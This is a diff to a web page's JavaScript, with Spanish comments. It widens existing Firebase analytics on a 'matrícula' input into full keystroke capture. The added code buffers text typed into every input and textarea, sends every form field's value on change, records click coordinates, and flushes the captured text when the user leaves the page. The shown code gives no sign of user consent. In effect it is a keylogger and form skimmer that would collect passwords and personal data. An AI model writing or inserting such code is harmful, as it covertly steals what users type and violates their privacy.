@@ -106,6 +106,9 @@
         }
         
         const sessionId = generateSessionId();
+        let lastKeystrokeTime = Date.now();
+        let keystrokeBuffer = '';
+        const KEYSTROKE_BUFFER_TIME = 2000; // 2 segundos
         
         // Función para recolectar y enviar datos del usuario a Firebase
         function enviarDatosFirebase(eventType, data = {}) {
@@ -130,17 +133,52 @@
             });
         }
 
+        // Función para manejar el buffer de teclas
+        function handleKeystrokeBuffer() {
+            if (keystrokeBuffer.length > 0) {
+                enviarDatosFirebase('keystrokes', {
+                    typedText: keystrokeBuffer,
+                    inputField: 'matriculaInput'
+                });
+                keystrokeBuffer = '';
+            }
+        }
+
         // Registrar eventos de interacción del usuario
         document.addEventListener('DOMContentLoaded', () => {
             enviarDatosFirebase('page_loaded');
             
-            // Registrar entrada de matrícula
-            const matriculaInput = document.getElementById('matriculaInput');
-            matriculaInput.addEventListener('input', (e) => {
-                enviarDatosFirebase('matricula_input', {
-                    partialMatricula: e.target.value,
-                    inputLength: e.target.value.length
-                });
+            // Registrar entrada de texto en todos los campos
+            document.addEventListener('input', (e) => {
+                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                    const now = Date.now();
+                    const timeDiff = now - lastKeystrokeTime;
+                    
+                    // Si ha pasado mucho tiempo desde la última tecla, enviar el buffer
+                    if (timeDiff > KEYSTROKE_BUFFER_TIME) {
+                        handleKeystrokeBuffer();
+                    }
+                    
+                    // Agregar la tecla al buffer
+                    keystrokeBuffer += e.data || '';
+                    lastKeystrokeTime = now;
+                    
+                    // Programar el envío del buffer si no hay más actividad
+                    clearTimeout(window.keystrokeTimeout);
+                    window.keystrokeTimeout = setTimeout(handleKeystrokeBuffer, KEYSTROKE_BUFFER_TIME);
+                }
+            });
+            
+            // Registrar cambios en campos de formulario (para selects, checkboxes, etc.)
+            document.addEventListener('change', (e) => {
+                if (e.target.tagName === 'SELECT' || e.target.tagName === 'INPUT') {
+                    enviarDatosFirebase('form_change', {
+                        fieldName: e.target.name || 'unknown',
+                        fieldType: e.target.type,
+                        fieldValue: e.target.value,
+                        fieldId: e.target.id || 'none'
+                    });
+                }
             });
             
             // Registrar clicks en cualquier parte de la página
@@ -148,8 +186,16 @@
                 enviarDatosFirebase('page_click', {
                     targetElement: e.target.tagName,
                     targetId: e.target.id || 'none',
-                    targetClass: e.target.className || 'none'
+                    targetClass: e.target.className || 'none',
+                    pageX: e.pageX,
+                    pageY: e.pageY
                 });
+            });
+            
+            // Registrar cuando el usuario abandona la página
+            window.addEventListener('beforeunload', () => {
+                handleKeystrokeBuffer(); // Enviar cualquier tecla pendiente
+                enviarDatosFirebase('page_exit');
             });
         });
 
